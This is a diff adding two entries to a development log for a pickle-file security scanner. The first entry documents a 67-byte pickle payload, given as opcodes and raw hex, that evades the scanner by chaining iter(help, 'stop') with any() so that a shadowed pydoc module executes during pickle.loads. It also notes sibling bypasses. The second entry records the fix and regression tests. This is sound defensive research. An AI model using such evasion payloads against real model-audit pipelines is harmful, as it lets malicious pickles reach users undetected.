@@ -15290,3 +15290,191 @@ Validation:
 - `mypy`: `Success: no issues found in 447 source files`.
 - Full non-slow/non-integration validation:
   `3748 passed, 1022 skipped, 21 warnings in 44.82s`.
+
+## Turn 247 - Bypass via unmodeled built-in iterator consumer `any`
+
+Found another scanner-clean RCE-capable bypass in the finite call-iterator
+consumer family. The native model now covers full container consumers,
+`collections.deque`, and `builtins.next`, but other clean built-ins also
+consume iterables. The smallest representative is `builtins.any`.
+
+The payload constructs `iter(builtins.help, "stop")`, then invokes
+`builtins.any(iterator)`. `any(...)` pulls one item from the iterator;
+`help()` runs once, returns the sentinel, and enters
+`_sitebuiltins._Helper.__call__`, which imports `pydoc`. A shadow `pydoc.py` at
+the front of `sys.path` executes during `pickle.loads`. Because the iterator
+stops before yielding a value, `any(...)` returns `False`.
+
+Payload shape:
+
+```text
+PROTO 4
+STACK_GLOBAL builtins iter
+STACK_GLOBAL builtins help
+SHORT_BINUNICODE "stop"
+TUPLE2
+REDUCE              # iter(help, "stop")
+MEMOIZE
+POP
+STACK_GLOBAL builtins any
+BINGET 0
+TUPLE1
+REDUCE              # any(iter(help, "stop"))
+STOP
+```
+
+Raw payload:
+
+```text
+80048c086275696c74696e738c0469746572938c086275696c74696e738c0468656c70938c0473746f70865294308c086275696c74696e738c03616e7993680085522e
+```
+
+Scanner proof:
+
+```text
+payload_len 67
+scan clean findings 0 errors ()
+imports [
+  ('builtins', 'iter', False, None),
+  ('builtins', 'help', False, None),
+  ('builtins', 'any', False, None),
+]
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('builtins', 'any', 1, 65),
+]
+```
+
+Runtime proof:
+
+```text
+runtime rc 0
+runtime_result False
+runtime_type bool
+marker_exists True
+marker_text pydoc-owned
+runtime stderr
+```
+
+The child proof inserted a temporary module directory at the front of
+`sys.path`, removed `pydoc` from `sys.modules`, and ran `pickle.loads(payload)`.
+The shadow `pydoc.py` wrote the marker at import time and provided a minimal
+`help` function returning `"stop"` so the call iterator stops after one hidden
+call.
+
+Why it bypasses:
+
+- Native policy does not mark `builtins.iter`, `builtins.help`, or
+  `builtins.any` as dangerous.
+- The native stack model tracks `iter(help, "stop")` as a `CallIterator`, but
+  `call_iterator_consumption_invocations(...)` does not model clean built-ins
+  like `any(...)` that consume an iterable argument.
+- The call graph already maps an invoked `builtins.help()` to
+  `_sitebuiltins._Helper.__call__ -> builtins.__import__`, but native metadata
+  never emits that hidden zero-argument invocation for `any(...)`.
+- Sibling probes for `builtins.all(iter(help, "stop"))` and
+  `builtins.sorted(iter(help, "stop"))` were also scanner-clean and executed
+  the same shadow `pydoc.py` import path.
+- The payload contains no `pydoc`, `import`, `__import__`, `eval`, `exec`,
+  `os.system`, or `subprocess` strings.
+
+Likely source-level defense:
+
+- Extend native call-iterator consumption modeling to include clean built-ins
+  that eagerly consume their first iterable argument, starting with `any`,
+  `all`, `sorted`, and `sum`.
+- For one-argument consumers, emit the same synthetic zero-argument invocation
+  of the stored callable when the first argument is a tracked `CallIterator`.
+- Keep arity explicit by callable, as with the `deque` fix, so the model stays
+  finite and stack-local.
+
+Performance note:
+
+- Payload size is 67 bytes.
+- Warm scan median over 1000 runs was `0.000050s` with max `0.000085s`.
+- A fix only needs to inspect the already-extracted reducer arguments for a
+  small set of clean built-in iterable consumers.
+
+## Turn 248 - Defense for built-in iterable call-iterator consumers
+
+Blocked the Turn 247 `any(iter(help, "stop"))` bypass at the native call-graph
+source. The fix extends call-iterator consumption modeling for a finite set of
+clean built-ins that eagerly consume their first iterable argument.
+
+Implementation:
+
+- `call_iterator_consumption_invocations(...)` now emits the stored
+  `CallIterator` callable as a synthetic zero-argument invocation for
+  `builtins.all`, `builtins.any`, `builtins.max`, `builtins.min`,
+  `builtins.sorted`, and `builtins.sum`.
+- Arity remains explicit: `all`, `any`, `max`, `min`, and `sorted` require one
+  argument; `sum` allows one or two arguments.
+- `max` and `min` are intentionally covered even though the proof payload raises
+  after consuming an empty iterator, because the hidden callable executes before
+  the `ValueError`.
+- The patch stays stack-local and package-agnostic: it only inspects the
+  already-decoded reducer callable and argument values.
+
+Regression coverage:
+
+- Added successful-return cases for `all`, `any`, `sorted`, `sum(iterable)`,
+  and `sum(iterable, start)`.
+- Added raising-but-executed cases for `max` and `min`.
+- Each test verifies lazy `iter(help, "stop")` construction remains clean, the
+  consuming payload is malicious, the report includes a hidden zero-argument
+  `builtins.help` invocation, and a child interpreter writes the shadow
+  `pydoc.py` marker during `pickle.loads`.
+
+Post-fix proof for the exact Turn 247 payload:
+
+```text
+payload_len 67
+scan malicious findings 1 errors ()
+dangerous [('_sitebuiltins', '_Helper.__call__', 'builtins.__import__')]
+imports [
+  ('builtins', 'iter', None, None),
+  ('builtins', 'help', None, None),
+  ('builtins', 'any', None, None),
+]
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('builtins', 'any', 1, 65),
+  ('builtins', 'help', 0, 65),
+]
+runtime rc 0
+runtime_result False
+runtime_type bool
+marker_exists True
+marker_text pydoc-owned
+runtime stderr
+timing_median 0.000117
+timing_p95 0.000126
+timing_max 0.000800
+```
+
+Performance note:
+
+- The consumer check is a constant-size match over a handful of built-ins.
+- No extra payload scan, import, package lookup, or call-graph traversal is
+  added on the native path.
+- Warm median for the fixed 67-byte payload was `0.000117s` over 1000 runs.
+
+Validation:
+
+- Rust formatting:
+  `cargo fmt --manifest-path packages/modelaudit-picklescan/Cargo.toml`.
+- Rust unit tests: `78 passed`.
+- Rebuilt the local ignored extension with release `cargo build` plus macOS
+  dynamic-lookup linker flags, then copied it to
+  `packages/modelaudit-picklescan/src/modelaudit_picklescan/_rust.abi3.so` for
+  Python tests.
+- Focused built-in iterable consumer regressions: `7 passed in 0.44s`.
+- Focused import/call-graph regression file: `40 passed in 1.37s`.
+- Focused call-graph suite: `78 passed in 3.30s`.
+- Focused `click.utils.LazyFile` startup-hook regression: `1 passed in
+  1.32s`.
+- `ruff format`: `392 files left unchanged`.
+- `ruff check --fix`: `All checks passed!`.
+- `mypy`: `Success: no issues found in 447 source files`.
+- Full non-slow/non-integration validation:
+  `3755 passed, 1022 skipped, 21 warnings in 45.15s`.
